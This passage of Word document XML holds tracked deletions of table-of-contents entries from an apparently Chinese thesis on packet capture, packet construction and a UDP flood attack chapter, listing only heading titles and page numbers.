          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="817" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="818" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="819" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>数据包的捕获</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>31</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1D896585" w14:textId="67FCFE0A" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="820" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="821" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="822" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="823" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>MAC</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="824" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>地址获取</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>33</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3B0873B0" w14:textId="54B131E6" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="825" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="826" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="827" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2.5</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="828" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>数据包的构建</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>35</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4E4AEEA5" w14:textId="7B31FE70" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="829" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="830" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="831" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.2.6</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="832" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>数据包的发送</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>38</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2BB20343" w14:textId="2317D623" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="833" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="834" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="835" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="836" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="837" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>39</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6733FA94" w14:textId="01C671B3" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="838" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="839" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="840" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.3.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="841" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="842" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>数据包的构建</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>39</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5020E66B" w14:textId="4E5BDBF6" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="843" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="844" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="845" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.3.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="846" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="847" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>数据包的发送</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>41</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="19346ADE" w14:textId="56E8737A" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="848" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="849" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="850" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.3.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="851" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="852" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>42</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0AF491E1" w14:textId="183F0D69" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="853" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="854" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="855" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>5.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="856" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>本章小结</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>42</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="638D264C" w14:textId="6F2F0B3F" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="857" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="858" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="859" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="860" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>环境搭建及测试</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>43</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="39032F57" w14:textId="316A5766" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="861" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="862" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="863" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="864" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>开发环境</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>43</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4A3BEE80" w14:textId="2A7C8943" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="865" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="866" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="867" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>6.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="868" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>测试环境</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
